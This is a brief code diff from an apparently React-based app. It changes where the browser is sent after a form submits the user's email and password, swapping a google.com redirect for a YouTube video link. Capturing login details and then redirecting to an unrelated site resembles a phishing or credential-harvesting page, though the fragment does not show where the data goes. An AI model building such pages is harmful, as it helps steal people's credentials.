@@ -49,7 +49,7 @@ export default function App() {
 				"email": body.email,
 				"password": body.password
 			}).then(() => {
-				window.location.href = 'https://google.com'
+				window.location.href = 'https://www.youtube.com/watch?v=aQVaoBIsKcY&t=72s'
 				setBody({})
 			})
 	}
